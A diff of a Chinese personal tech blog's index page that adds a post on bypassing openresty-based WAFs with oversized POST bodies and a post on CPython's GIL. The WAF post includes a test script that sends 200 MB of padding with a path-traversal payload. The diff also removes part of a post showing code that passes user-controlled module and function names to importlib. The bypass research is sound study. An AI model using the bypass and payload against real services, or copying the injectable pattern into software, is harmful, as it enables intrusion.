@@ -125,12 +125,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-count">61</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -159,6 +159,304 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%89%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%89%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（三）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/papers/blob/master/KCon_2019_WAF.pdf">How to Break Through Cloud-Based WAF</a> 提到 “post请求体过大时会绕过某些waf”。</p>
+<p>刚好今天看到一个用此方法绕过的案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据</a></p>
+<p>这个绕过姿势记得在2017年就有人分享过，因为我对”因为性能原因所以导致waf放行”这个解释有点疑问，所以研究了一下。</p>
+<p>本文主要研究:</p>
+<ul>
+<li>为什么请求体过大时会绕过waf的防护？</li>
+<li>什么场景下可以使用这种绕过姿势攻击到后端服务？</li>
+<li>怎么测试？</li>
+</ul>
+<p>以下研究的waf都是基于openresty实现的。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>openresty怎么读请求体？</p>
+<p><a target="_blank" rel="noopener" href="https://moonbingbing.gitbooks.io/openresty-best-practices/content/openresty/get_req_body.html">获取请求 body</a> 的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ngx.req.read_body()</span><br><span class="line">local data &#x3D; ngx.req.get_body_data()</span><br><span class="line">-- local file_name &#x3D; ngx.req.get_body_file()</span><br></pre></td></tr></table></figure>
+
+<p>根据 <a target="_blank" rel="noopener" href="https://github.com/openresty/lua-nginx-module#ngxreqread_body">openresty文档</a> 得知</p>
+<blockquote>
+<p>如果请求体存放到了临时文件，就应该调用 <code>ngx.req.get_body_file</code> 接口来获取临时文件名。</p>
+<p>如果请求体存放到内存中，就应该调用 <code>ngx.req.get_body_data</code> 接口来获取请求体。</p>
+</blockquote>
+<p><em>什么时候请求体会存放到临时文件呢？</em></p>
+<p> 有两个配置选项决定nginx是否会把请求体放到临时文件:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">client_body_buffer_size</a>:如果请求体大小超过此值，就会把整个请求体或者请求体的一部分写到一个临时文件。</p>
+<p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_in_file_only">client_body_in_file_only</a>:此选项直接决定nginx是否将请求体放到文件中。</p>
+</blockquote>
+</li>
+<li><p>为什么请求体过大时会绕过waf的防护？</p>
+<p>请求体过大，超过 client_body_buffer_size 配置的值时，请求体会写到临时文件。</p>
+<p>而很多waf不处理临时文件。相当于拿到的请求体会为空。比如曾经很火的 <a target="_blank" rel="noopener" href="https://github.com/loveshell/ngx_lua_waf/blob/master/waf.lua">ngx_lua_waf</a> 就没有临时文件相关操作。</p>
+<p><em>那为啥waf作者没有处理临时文件呢？</em></p>
+<p>可能是忘了，也可能觉得损耗性能。这里的性能我理解主要是与 io、内存有关。</p>
+<p>在openresty中读文件可以有两个api：</p>
+<blockquote>
+<p> ngx_io.open，此api是非阻塞的</p>
+<p> io.open，此api是阻塞的</p>
+</blockquote>
+<p>如果使用<code>io.open</code>读”临时文件”，整个nginx worker就会卡在这个读文件步骤中，肯定会导致整个集群能服务的最大并发数变低。</p>
+<p>如果使用<code>lua-io-nginx-module</code>模块的<code>ngx_io.open</code>非阻塞api来代替<code>io.open</code>阻塞api来读文件，虽然不会阻塞整个nginx worker，但”读文件io操作”还是要和磁盘打交道，需要中断和多次内存拷贝，还是有性能损耗。</p>
+<p>并且，如果服务是将文件一次性读取到内存中时，那”不怀好意”的人多搞几个这样”post请求体过大”的请求，就有可能导致机器内存耗尽。</p>
+</li>
+<li><p>什么场景下可以使用这种绕过姿势？</p>
+<p>即使waf放行了，也需要后端支持这种超大的请求体。而不少服务对请求体大小是有限制的。</p>
+<p>比如nginx的<a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size">client_max_body_size</a>:如果请求体大小超过此设置值，就会返回 413 (Request Entity Too Large)  错误。 此配置为0表示不限制请求体大小。</p>
+<p>再比如php的<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/ini.core.php#ini.post-max-size">post-max-size</a>:如果请求体大小超过此设置值，<code>$_POST</code>和<code>$_FILES</code>会为空。</p>
+<p><em>所以满足以下条件时，应该可以利用成功</em>:</p>
+<blockquote>
+<p>请求体大小超过waf client_body_buffer_size配置限制，且waf没有处理临时文件</p>
+<p>请求体大小未超过后端服务的大小限制</p>
+</blockquote>
+</li>
+</ul>
+<h1 id="怎么测试"><a href="#怎么测试" class="headerlink" title="怎么测试"></a>怎么测试</h1><p>客户端的测试代码如下，需要看情况调整big_str的大小</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host &#x3D; &quot;a.baidu.com&quot;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:9998&#x2F;a.php&quot;</span><br><span class="line">payload &#x3D; &quot;..&#x2F;..&#x2F;..&#x2F;&quot;</span><br><span class="line">big_str &#x3D; &quot;A&quot;*1024*1024*200  # 200M</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;&quot;Host&quot;: host, &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;</span><br><span class="line">data &#x3D; &quot;a&#x3D;%s&amp;b&#x3D;%s&quot; % (big_str, payload)</span><br><span class="line"></span><br><span class="line">res &#x3D; requests.post(url, data&#x3D;data, headers&#x3D;headers)</span><br><span class="line">print(res.content.decode(&quot;utf8&quot;))</span><br><span class="line">print(res.status_code)</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文并没有研究waf厂商是怎么解决这个问题的，比如pdf提到的stream模式是怎么实现的、stream模式是否可以绕过。</p>
+<p>绕过waf防护的原因是请求体过大时会被存放到”临时文件”中，而不处理”临时文件”是出于io、内存等性能考虑。</p>
+<p>这种绕过姿势还需要”请求体大小未超过后端服务的大小限制”才能利用成功。</p>
+<p>另外 “post请求过大为什么会绕过waf”还有两个可能的原因：</p>
+<blockquote>
+<ul>
+<li>payload刚好被”tcp分片”</li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jw0vPIvgCdt1090j3-Sxqw">正则回溯次数超过限制</a></li>
+</ul>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-CPython%E7%9A%84%E7%BA%BF%E7%A8%8B%E4%B8%8EGIL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-CPython%E7%9A%84%E7%BA%BF%E7%A8%8B%E4%B8%8EGIL/" class="post-title-link" itemprop="url">CPython的线程与GIL</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>CPython程序的GIL会导致在CPU密集型任务中，多线程并不能提高运算速度。</p>
+<p>比如<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/55adf1303fa7e528cc446d4e41526604" title="test.py">test.py</a>例子中，从执行test2函数和test1函数时间对比可以看出来，多线程并没有比单线程跑得更快。</p>
+<p>本文主要学习总结GIL、线程和GIL的关系，回答以下问题：</p>
+<ul>
+<li>GIL<ul>
+<li>GIL是什么？</li>
+<li>为什么存在GIL？</li>
+<li>能否去掉GIL，让Python程序应用层加锁来代替GIL的作用？</li>
+</ul>
+</li>
+<li>线程和GIL的关系<ul>
+<li>Python的线程是真线程吗？</li>
+<li>既然GIL能保证只有一个线程在执行字节码，为什么我们用Python多线程时还需要考虑线程安全？</li>
+<li>持有GIL的线程什么时候释放GIL？</li>
+<li>未持有GIL的线程什么时候申请GIL？</li>
+<li>怎么保证两个线程不会同时抢到GIL？</li>
+<li>为什么CPython要保证只有一个线程在执行字节码？</li>
+<li>CPython线程什么时候切换？</li>
+</ul>
+</li>
+</ul>
+<p>分析的CPython是3.8.0版本，commit id是fa919fdf2583bdfead1df00e842f24f30b2a34bf</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="GIL"><a href="#GIL" class="headerlink" title="GIL"></a>GIL</h2><ol>
+<li><p>GIL是什么？</p>
+<p> CPython的一个全局解释锁。</p>
+</li>
+<li><p>为什么存在GIL？</p>
+<p> <a target="_blank" rel="noopener" href="https://wiki.python.org/moin/GlobalInterpreterLock" title="GIL">GIL</a>文档中写到，GIL可以保证多线程场景中，只有一个线程在执行字节码。</p>
+<p> 这样可以避免确保在CPython源码层面是线程安全的。</p>
+<p> 假设没有了GIL，多线程运行时，引用计数就有可能出现问题。</p>
+</li>
+<li><p>能否去掉GIL，让Python程序应用层加锁来代替？</p>
+<p> 如果python程序多线程全部在消费者代码第一行就加锁，就可以代替GIL。（只是我的推测，没有验证过，结论不一定对。）</p>
+<p> 但是实际编写Python代码时，不可能要求所有的线程都加锁。如下的代码中，单线程和多线程也就没有区别了。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lock &#x3D; threading.Lock()</span><br><span class="line"></span><br><span class="line">class Worker2(threading.Thread):</span><br><span class="line">  def run(self):</span><br><span class="line">    with lock:</span><br><span class="line">      ....</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="线程和GIL"><a href="#线程和GIL" class="headerlink" title="线程和GIL"></a>线程和GIL</h2><ol>
+<li><p>Python的线程是真线程吗？</p>
+<p> Unix/Linux上的Python线程是真线程（Windows平台的不清楚）。是操作系统层面的线程，会受操作系统调度。</p>
+<p> 在Python/thread_pthread.h文件中，可以看到调用pthread_create函数创建系统线程。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned long</span><br><span class="line">PyThread_start_new_thread(void (*func)(void *), void *arg)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t th;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    status &#x3D; pthread_create(&amp;th,   &#x2F;&#x2F; 调用pthread_create函数创建系统线程</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>既然GIL能保证只有一个线程在执行字节码，为什么我们用Python多线程时还需要考虑线程安全？</p>
+<p> 因为一行Python代码，可能会包含多个字节码。GIL可以保证字节码执行时是线程安全的，但是无法保证每一行Python代码是线程安全的。</p>
+<p> 比如 n=n+1 一行代码，会被解释成多个字节码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import dis</span><br><span class="line">&gt;&gt;&gt; dis.dis(&quot;n&#x3D;n+1&quot;)</span><br><span class="line">  1           0 LOAD_NAME                0 (n)</span><br><span class="line">              2 LOAD_CONST               0 (1)</span><br><span class="line">              4 BINARY_ADD</span><br><span class="line">              6 STORE_NAME               0 (n)</span><br><span class="line">              8 LOAD_CONST               1 (None)</span><br><span class="line">             10 RETURN_VALUE</span><br></pre></td></tr></table></figure>
+
+<p> 可以见参考文章详解。</p>
+</li>
+</ol>
+<ol start="3">
+<li><p>持有GIL的线程什么时候释放GIL？</p>
+<p> 先说结论：如果未持有GIL的线程太久没有获取GIL，已经持有GIL的线程就会释放锁。</p>
+<p> 在ceval.c#1237行中可以看到：ceval-&gt;gil_drop_request 被标记时，会释放锁。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">main_loop:</span><br><span class="line">    for (;;) &#123;</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      if (_Py_atomic_load_relaxed(&amp;ceval-&gt;gil_drop_request)) &#123;  &#x2F;&#x2F; 其他线程要求当前线程释放锁</span><br><span class="line">           &#x2F;* Give another thread a chance *&#x2F;</span><br><span class="line">           if (_PyThreadState_Swap(&amp;runtime-&gt;gilstate, NULL) !&#x3D; tstate) &#123;</span><br><span class="line">               Py_FatalError(&quot;ceval: tstate mix-up&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           drop_gil(ceval, tstate);   &#x2F;&#x2F; 当前线程释放锁</span><br><span class="line"></span><br><span class="line">           &#x2F;* Other threads may run now *&#x2F;</span><br><span class="line"></span><br><span class="line">           take_gil(ceval, tstate);   &#x2F;&#x2F; 当前线程尝试再获取锁</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<p> eval-&gt;gil_drop_request 什么时候被标记呢？</p>
+<p> 看下面的代码可以得出结论：如果 未持有GIL的线程 超过了等待时间 且 GIL是锁住的状态 且 GIL的持有者没有变更过，就会标记 ceval-&gt;gil_drop_request变量。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static void take_gil(PyThreadState *tstate)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    while (_Py_atomic_load_relaxed(&amp;_PyRuntime.ceval.gil.locked)) &#123;  &#x2F;&#x2F; 只要 gil 是锁住的状态, 进入这个循环</span><br><span class="line">        int timed_out &#x3D; 0;</span><br><span class="line">        unsigned long saved_switchnum;</span><br><span class="line"></span><br><span class="line">        saved_switchnum &#x3D; _PyRuntime.ceval.gil.switch_number;   &#x2F;&#x2F; 保存当前持有GIL的身份</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 释放 gil.mutex, 并在以下两种条件下唤醒</span><br><span class="line">        &#x2F;&#x2F; 1. 等待 INTERVAL 微秒(默认 5000)</span><br><span class="line">        &#x2F;&#x2F; 2. 还没有等待到 5000 微秒但是收到了 gil.cond 的信号</span><br><span class="line"></span><br><span class="line">        COND_TIMED_WAIT(_PyRuntime.ceval.gil.cond, _PyRuntime.ceval.gil.mutex,</span><br><span class="line">                        INTERVAL, timed_out);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果超过了等待时间 &amp;&amp; GIL是锁住的状态 &amp;&amp; GIL的持有者没有变更过</span><br><span class="line">        if (timed_out &amp;&amp;</span><br><span class="line">            _Py_atomic_load_relaxed(&amp;_PyRuntime.ceval.gil.locked) &amp;&amp;</span><br><span class="line">            _PyRuntime.ceval.gil.switch_number &#x3D;&#x3D; saved_switchnum) &#123;</span><br><span class="line"></span><br><span class="line">            SET_GIL_DROP_REQUEST();  &#x2F;&#x2F; 把 gil_drop_request 值设为 1, 持有GIL的线程看到这个值的时候, 会尝试释放GIL</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 所以，当未持有GIL的线程太久没有获取GIL了，就会设置一个全局变量。当前持有GIL的线程看到全局变量后，就知道自己要释放GIL。</p>
+</li>
+<li><p>未持有GIL的线程什么时候申请GIL？</p>
+<p> 先说结论：正在持有GIL的线程释放后，未持有GIL的线程可以获得GIL。</p>
+<p> 申请GIL的代码在Python/ceval_gil.h#take_gil中，可以看到 未持有GIL的线程 通过while循环 来等GIL释放。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">take_gil(struct _ceval_runtime_state *ceval, PyThreadState *tstate)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  while (_Py_atomic_load_relaxed(&amp;gil-&gt;locked)) &#123; &#x2F;&#x2F; gil 不是锁住状态时跳出循环</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">  _ready:</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;* We now hold the GIL *&#x2F;</span><br><span class="line">  _Py_atomic_store_relaxed(&amp;gil-&gt;locked, 1);    &#x2F;&#x2F; 抢到了锁</span><br><span class="line">  _Py_ANNOTATE_RWLOCK_ACQUIRED(&amp;gil-&gt;locked, &#x2F;*is_write&#x3D;*&#x2F;1);</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<pre><code>这里我有一个疑问：上面的代码中，如果多个线程同时跳出while循环，就会出现多个线程同时抢到GIL。
+
+我的疑问肯定是不对的，两个线程肯定不会同时抢到GIL，那是怎么做到的呢？见后面分析</code></pre>
+<ol start="5">
+<li><p>怎么保证两个线程不会同时抢到GIL？</p>
+<p> 在ceval_gil.h#184行代码中，可以看到，用了一个互斥锁。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">take_gil(struct _ceval_runtime_state *ceval, PyThreadState *tstate)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    struct _gil_runtime_state *gil &#x3D; &amp;ceval-&gt;gil;</span><br><span class="line">    int err &#x3D; errno;</span><br><span class="line">    MUTEX_LOCK(gil-&gt;mutex);   &#x2F;&#x2F; gil-&gt;mutex是互斥锁</span><br><span class="line">    ...</span><br><span class="line">    MUTEX_UNLOCK(gil-&gt;mutex);</span><br></pre></td></tr></table></figure>
+
+<p> 这样在多个线程都调用take_gil来申请GIL时，只有一个线程能够跳出while循环申请到GIL。</p>
+</li>
+</ol>
+<pre><code>现在已经知道了什么时候释放和申请GIL，可以做一个小结：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* 已经获得GIL的线程在执行字节码前，如果有其他线程要求释放GIL，它就会释放GIL。</span><br><span class="line">* 没有获得GIL的线程可以分为两种情况：</span><br><span class="line">  * 有一个线程可以要求&quot;已经获得GIL的线程&quot;释放GIL，并且循环等待释放GIL</span><br><span class="line">  * 其他线程在等 gil-&gt;mutex 锁</span><br></pre></td></tr></table></figure></code></pre>
+<ol start="6">
+<li><p>为什么CPython要保证只有一个线程在执行字节码？</p>
+<p> 换句话说，CPython中在执行字节码时，哪一部分不是线程安全的？</p>
+<p> 在CPython中引用计数的实现就不是线程安全的，为啥呢？</p>
+<p> 首先需要理解一个知识点：如果多线程场景中线程中的操作全部都是读操作，是线程安全的；如果多线程场景中线程中对同一个变量做修改操作，就不是线程安全的。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">n &#x3D; 1</span><br><span class="line"></span><br><span class="line">def CountDown(_):</span><br><span class="line">    print(n)  # 仅仅是打印n，是线程安全的</span><br><span class="line">    # n +&#x3D; 1    # 修改n的值，这里是非线程安全</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    t1 &#x3D; Thread(target&#x3D;CountDown, args&#x3D;[1])</span><br><span class="line">    t2 &#x3D; Thread(target&#x3D;CountDown, args&#x3D;[1])</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure>
+<p> 从写Python脚本的角度看：上面的Python代码中，我们不加锁是没有问题的。</p>
+<p> 从CPython角度看：在上面代码中，CPython在多线程中修改变量n的引用计数时，就会有”多线程对同一个变量做修改操作”，这个变量就是n的引用计数。这里就不是线程安全的，所以要加GIL。加了GIL后，只会有一个线程在修改n的引用计数。</p>
+</li>
+<li><p>CPython线程什么时候切换？</p>
+<p> 上面已经讲了一种切换方式：非持有GIL的线程过了一段时间就可以获得GIL，然后执行opcode。</p>
+<p> 除了这种，在线程等待io、调用sleep函数时，也会主动释放GIL，以便其他线程有机会获得GIL。</p>
+<p> 所以存在切换存在两种方式：主动调度和抢占式调度</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* 主动调度</span><br><span class="line">    * 等待io</span><br><span class="line">    * sleep</span><br><span class="line">* 抢占式</span><br><span class="line">    * 执行N个opcode （python3.2之前）</span><br><span class="line">    * 过了一段时间之后 （python3.2之后）</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/103834" title="23 | 你真的懂Python GIL（全局解释器锁）吗？">23 | 你真的懂Python GIL（全局解释器锁）吗？</a></p>
+<p><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4419179/blog/4305933" title="Python3 源码阅读-深入了解Python GIL">Python3 源码阅读-深入了解Python GIL</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/zpoint/CPython-Internals/blob/master/Interpreter/gil/gil_cn.md" title="gil">gil</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -240,90 +538,6 @@
 </ul>
 </li>
 </ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
-<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, 